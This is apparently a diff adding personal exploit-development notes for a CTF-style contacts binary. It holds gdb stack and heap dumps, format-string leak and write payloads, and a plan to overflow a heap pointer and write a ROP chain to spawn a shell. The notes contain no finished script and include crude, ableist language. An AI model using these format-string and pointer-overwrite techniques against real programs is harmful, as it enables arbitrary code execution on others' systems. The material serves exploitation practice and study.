@@ -1,0 +1,331 @@
+function call at
+0x8048C94
+
+calls a function that has a formatstring vuln
+
+
+createContact('AAAA'*16,name='AAAABBBB')
+
+k so everything is in the heap, this is good
+
+0x804c010:	0x00000000	0x00000049	0x41414141	0x41414141
+0x804c020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804c030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804c040:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804c050:	0x41414141	0x41414141	0x00000000	0x00020fa9
+0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+
+gameplan:
+
+put all the addresses I want in the first contact 
+then I can easily access them
+
+wait no, I'm retarded. I need some stuff on the stack
+to pop
+shit.
+
+
+
+
+The previous value for description length is the value for name length
+this fucks shit up
+
+
+kk here is the stack at the printf
+
+
+0000| 0xffffd2d0 --> 0x804c018 ('A' <repeats 64 times>)
+0004| 0xffffd2d4 --> 0x804c008 ("1337")
+0008| 0xffffd2d8 --> 0xf7e59dab (<_IO_vfscanf+11>:	add    ebx,0x157255)
+0012| 0xffffd2dc --> 0xf7fb1000 --> 0x1a8da8 
+0016| 0xffffd2e0 --> 0x0 
+0020| 0xffffd2e4 --> 0x0 
+0024| 0xffffd2e8 --> 0xffffd318 --> 0xffffd348 --> 0x0 
+0028| 0xffffd2ec --> 0x8048c99 (add    DWORD PTR [ebp-0xc],0x1)
+0032| 0xffffd2f0 --> 0x804b0a8 ("AAAABBBB")
+0036| 0xffffd2f4 --> 0x40 ('@')
+0040| 0xffffd2f8 --> 0x804c008 ("1337")
+0044| 0xffffd2fc --> 0x804c018 ('A' <repeats 64 times>)
+0048| 0xffffd300 --> 0xf7fb1ac0 --> 0xfbad2887 
+0052| 0xffffd304 --> 0x8048ed6 --> 0x25007325 ('%s')
+0056| 0xffffd308 --> 0x804b0a0 --> 0x804c018 ('A' <repeats 64 times>)
+0060| 0xffffd30c --> 0x0 
+0064| 0xffffd310 --> 0x0 
+0068| 0xffffd314 --> 0xf7fb1000 --> 0x1a8da8 
+0072| 0xffffd318 --> 0xffffd348 --> 0x0 
+0076| 0xffffd31c --> 0x80487a2 (jmp    0x80487b3)
+0080| 0xffffd320 --> 0x804b0a0 --> 0x804c018 ('A' <repeats 64 times>)
+0084| 0xffffd324 --> 0xffffd338 --> 0x4 
+0088| 0xffffd328 --> 0x50 ('P')
+0092| 0xffffd32c --> 0x0 
+0096| 0xffffd330 --> 0xf7fb13c4 --> 0xf7fb21e0 --> 0x0 
+0100| 0xffffd334 --> 0xf7ffd000 --> 0x20f30 
+0104| 0xffffd338 --> 0x4 
+0108| 0xffffd33c --> 0xa ('\n')
+0112| 0xffffd340 --> 0x8048df0 (push   ebp)
+
+
+
+I'm thinking I can change one of the pointers to my A's to point to something else
+then I'll edit the contact and change stuff in memory
+
+
+0000| 0xffffd2d0 --> 0x804c070 ("%14$n\n")
+0004| 0xffffd2d4 --> 0x804c060 ("3333")
+0008| 0xffffd2d8 --> 0xf7e59dab (<_IO_vfscanf+11>:	add    ebx,0x157255)
+0012| 0xffffd2dc --> 0xf7fb1000 --> 0x1a8da8 
+0016| 0xffffd2e0 --> 0x0 
+0020| 0xffffd2e4 --> 0x0 
+0024| 0xffffd2e8 --> 0xffffd318 --> 0xffffd348 --> 0x0 
+0028| 0xffffd2ec --> 0x8048c99 (add    DWORD PTR [ebp-0xc],0x1)
+0032| 0xffffd2f0 --> 0x804b0f8 ("CCCC")
+0036| 0xffffd2f4 --> 0xa ('\n')
+0040| 0xffffd2f8 --> 0x804c060 ("3333")
+0044| 0xffffd2fc --> 0x804c070 ("%14$n\n")
+0048| 0xffffd300 --> 0xf7fb1ac0 --> 0xfbad2887 
+0052| 0xffffd304 --> 0x8048ed6 --> 0x25007325 ('%s')
+0056| 0xffffd308 --> 0x804b0f0 --> 0x804c070 ("%14$n\n")
+0060| 0xffffd30c --> 0x1 
+0064| 0xffffd310 --> 0x0 
+0068| 0xffffd314 --> 0xf7fb1000 --> 0x1a8da8 
+0072| 0xffffd318 --> 0xffffd348 --> 0x0 
+0076| 0xffffd31c --> 0x80487a2 (jmp    0x80487b3)
+
+before:
+0056| 0xffffd308 --> 0x804b0f0 --> 0x804c070 ("%14$n\n")
+after:
+0056| 0xffffd308 --> 0x804b0f0 --> 0x0 
+
+
+now with hhn
+
+0056| 0xffffd308 --> 0x804b0f0 --> 0x804c000 --> 0x0 
+
+
+OvERfLOw!
+1
+AAAA
+1111
+4
+aaaa
+1
+BBBB
+2222
+4
+bbbb
+3 <--- If I try to print contacts before the 3 it doesn't work... 
+AAAA
+1
+cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
+4
+			description  pnumber	name
+0x804b0a0:	0x0804c018	0x0804c008	0x41414141	0x00000000
+0x804b0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0e0:	0x00000000	0x00000000	0x00000004	0x00000001
+0x804b0f0:	0x0804c038	0x0804c028	0x42424242	0x00000000
+0x804b100:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b110:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b120:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b130:	0x00000000	0x00000000	0x00000004	0x00000001
+
+
+0x804b0a0:	0x0804c018	0x0804c008	0x63636363	0x63636363
+0x804b0b0:	0x63636363	0x63636363	0x63636363	0x63636363
+0x804b0c0:	0x63636363	0x63636363	0x63636363	0x63636363
+0x804b0d0:	0x63636363	0x63636363	0x63636363	0x63636363
+0x804b0e0:	0x63636363	0x63636363	0x63636363	0x63636363
+0x804b0f0:	0x63636363	0x63636363	0x63636363	0x00000000
+0x804b100:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+OK so the game plan now is to use the format string
+to leak some nice stack addresses
+then I'll use my overflow to change the address of 
+the second contact's description to the stack and write
+in a rop chain to pop a shell
+
+
+
+
+stack
+
+0000| 0xffffd2d0 --> 0x804c058 ("%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.")
+0004| 0xffffd2d4 --> 0x804c048 ("1337")
+0008| 0xffffd2d8 --> 0xf7e59dab (<_IO_vfscanf+11>:	add    ebx,0x157255) #libc leak
+0012| 0xffffd2dc --> 0xf7fb1000 --> 0x1a8da8 
+0016| 0xffffd2e0 --> 0x0 
+0020| 0xffffd2e4 --> 0x0 
+0024| 0xffffd2e8 --> 0xffffd318 --> 0xffffd348 --> 0x0  # stack leak
+
+
+
+	leak to system
+From 0xf7e59dab to 0xf7e463e0: -80331 bytes, -20083 dwords (+1 bytes)
+	leak to eip
+From 0xffffd318 to 0xffffd2d8: -64 bytes, -16 dwords
+
+
+That's not working but have no fear there is a better way!!
+
+
+
+
+
+0000| 0xffffd2d0 --> 0x804c018 ('A' <repeats 64 times>)
+0004| 0xffffd2d4 --> 0x804c008 ("1337")
+0008| 0xffffd2d8 --> 0xf7e59dab (<_IO_vfscanf+11>:	add    ebx,0x157255)
+0012| 0xffffd2dc --> 0xf7fb1000 --> 0x1a8da8 
+0016| 0xffffd2e0 --> 0x0 
+0020| 0xffffd2e4 --> 0x0 
+0024| 0xffffd2e8 --> 0xffffd318 --> 0xffffd348 --> 0x0  <--- THIS 
+0028| 0xffffd2ec --> 0x8048c99 (add    DWORD PTR [ebp-0xc],0x1)
+0032| 0xffffd2f0 --> 0x804b0a8 ("AAAABBBB")
+0036| 0xffffd2f4 --> 0x40 ('@')
+0040| 0xffffd2f8 --> 0x804c008 ("1337")
+0044| 0xffffd2fc --> 0x804c018 ('A' <repeats 64 times>)
+0048| 0xffffd300 --> 0xf7fb1ac0 --> 0xfbad2887 
+0052| 0xffffd304 --> 0x8048ed6 --> 0x25007325 ('%s')
+0056| 0xffffd308 --> 0x804b0a0 --> 0x804c018 ('A' <repeats 64 times>)
+0060| 0xffffd30c --> 0x0 
+0064| 0xffffd310 --> 0x0 
+0068| 0xffffd314 --> 0xf7fb1000 --> 0x1a8da8 
+0072| 0xffffd318 --> 0xffffd348 --> 0x0  <--- AND  THIS 
+0076| 0xffffd31c --> 0x80487a2 (jmp    0x80487b3)
+0080| 0xffffd320 --> 0x804b0a0 --> 0x804c018 ('A' <repeats 64 times>)
+0084| 0xffffd324 --> 0xffffd338 --> 0x4 
+0088| 0xffffd328 --> 0x50 ('P')
+0092| 0xffffd32c --> 0x0 
+0096| 0xffffd330 --> 0xf7fb13c4 --> 0xf7fb21e0 --> 0x0 
+0100| 0xffffd334 --> 0xf7ffd000 --> 0x20f30 
+0104| 0xffffd338 --> 0x4 
+0108| 0xffffd33c --> 0xa ('\n')
+0112| 0xffffd340 --> 0x8048df0 (push   ebp)
+0116| 0xffffd344 --> 0
+0120| 0xffffd348 --> 0
+
+
+offset$
+6 | 0xffffd2e8 --> 0xffffd318 --> 0xffffd348 --> 0x0  <--- THIS 
+18| 0xffffd318 --> 0xffffd348 --> 0x0  <--- AND  THIS 
+30| 0xffffd348 --> 0
+
+
+at offset 6 we have a a pointer to another address on the stack
+ebp's maybe
+
+I can write half of a value that I want to 0xffffd348
+then I use offset 6 to change the pointer at offset 18 to point to the
+next byte of offset 30
+
+
+
+
+0000| 0xffa60800 --> 0x9b9a068 ("payload")
+0004| 0xffa60804 --> 0x9b9a058 ("1337")
+0008| 0xffa60808 --> 0xf7638dab (<_IO_vfscanf+11>:	add    ebx,0x157255)
+0012| 0xffa6080c --> 0xf7790000 --> 0x1a8da8 
+0016| 0xffa60810 --> 0x0 
+0020| 0xffa60814 --> 0x0 
+0024| 0xffa60818 --> 0xffa60848 --> 0xffa60878 --> 0x0 
+0028| 0xffa6081c --> 0x8048c99 (add    DWORD PTR [ebp-0xc],0x1)
+0032| 0xffa60820 --> 0x804b0f8 ("Hack")
+0036| 0xffa60824 --> 0x31e 
+0040| 0xffa60828 --> 0x9b9a058 ("1337")
+0044| 0xffa6082c --> 0x9b9a068 ("payload")
+0048| 0xffa60830 --> 0xf7790ac0 --> 0xfbad2887 
+0052| 0xffa60834 --> 0x8048ed6 --> 0x25007325 ('%s')
+0056| 0xffa60838 --> 0x804b0f0 --> 0x9b9a068 ("payload")
+0060| 0xffa6083c --> 0x1 
+0064| 0xffa60840 --> 0x0 
+0068| 0xffa60844 --> 0xf7790000 --> 0x1a8da8 
+0072| 0xffa60848 --> 0xffa60878 --> 0x0 
+0076| 0xffa6084c --> 0x80487a2 (jmp    0x80487b3)
+0080| 0xffa60850 --> 0x804b0a0 --> 0x9b9a018 ("leak..")
+0084| 0xffa60854 --> 0xffa60868 --> 0x4 
+0088| 0xffa60858 --> 0x50 ('P')
+0092| 0xffa6085c --> 0x0 
+0096| 0xffa60860 --> 0xf77903c4 --> 0xf77911e0 --> 0x0 
+0100| 0xffa60864 --> 0xf77dc000 --> 0x20f30 
+0104| 0xffa60868 --> 0x4 
+0108| 0xffa6086c --> 0xa ('\n')
+0112| 0xffa60870 --> 0x8048df0 (push   ebp)
+0116| 0xffa60874 --> 0x0 
+0120| 0xffa60878 --> 0x0 
+
+
+0000| 0xffa60800 --> 0x9b9a068 ("payload"...)
+0004| 0xffa60804 --> 0x9b9a058 ("1337")
+0008| 0xffa60808 --> 0xf7638dab (<_IO_vfscanf+11>:	add    ebx,0x157255)
+0012| 0xffa6080c --> 0xf7790000 --> 0x1a8da8 
+0016| 0xffa60810 --> 0x0 
+0020| 0xffa60814 --> 0x0 
+0024| 0xffa60818 --> 0xffa60848 --> 0xffa6081b --> 0x48c99ff 
+0028| 0xffa6081c --> 0x8048c99 (add    DWORD PTR [ebp-0xc],0x1)
+0032| 0xffa60820 --> 0x804b0f8 ("Hack")
+0036| 0xffa60824 --> 0x31e 
+0040| 0xffa60828 --> 0x9b9a058 ("1337")
+0044| 0xffa6082c --> 0x9b9a068 ("payload"...)
+0048| 0xffa60830 --> 0xf7790ac0 --> 0xfbad2887 
+0052| 0xffa60834 --> 0x8048ed6 --> 0x25007325 ('%s')
+0056| 0xffa60838 --> 0x804b0f0 --> 0x9b9a068 ("payload"...)
+0060| 0xffa6083c --> 0x1 
+0064| 0xffa60840 --> 0x0 
+0068| 0xffa60844 --> 0xf7790000 --> 0x1a8da8 
+0072| 0xffa60848 --> 0xffa6081b --> 0x48c99ff 
+0076| 0xffa6084c --> 0x80487a2 (jmp    0x80487b3)
+0080| 0xffa60850 --> 0x804b0a0 --> 0x9b9a018 ("Leak...")
+0084| 0xffa60854 --> 0xffa60868 --> 0x4 
+0088| 0xffa60858 --> 0x50 ('P')
+0092| 0xffa6085c --> 0x0 
+0096| 0xffa60860 --> 0xf77903c4 --> 0xf77911e0 --> 0x0 
+0100| 0xffa60864 --> 0xf77dc000 --> 0x20f30 
+0104| 0xffa60868 --> 0x4 
+0108| 0xffa6086c --> 0xa ('\n')
+0112| 0xffa60870 --> 0x8048df0 (push   ebp)
+0116| 0xffa60874 --> 0x0 
+0120| 0xffa60878 --> 0x5b ('[')
+
+
+Learning about printf order of operations
+
+payload = payload_use_offset_to_write_byte(offset1, lsbAddr3(0xffa60878) + 1)
+payload += payload_use_offset_to_write_byte(offset2, 0x41)
+
+
+
+18| 0xffa60848 --> (30)0xffa60878 --> 0x0 
+18| 0xffa60848 --> (30)0xffa60879 --> 0x41 
+A: %18$x->{{%18$s}} %30$p
+B: payload + A
+
+
+inc pointer
+write ptr
+
+order of operations:
+xp
+n
+s
+
+it makes copies too
+so the only way to have an effect and see it is to 
+give it a pointer and change what it points too
+before it prints %s
+
+A: fffdfd38->{{}} (nil)
+B: fffdfd38->{{A}} (nil)
+A: fffdfd39->{{}} 0x41
+B: fffdfd39->{{A}} 0x41Menu:
+
+
+
+
+
+
+
+
+
+
+
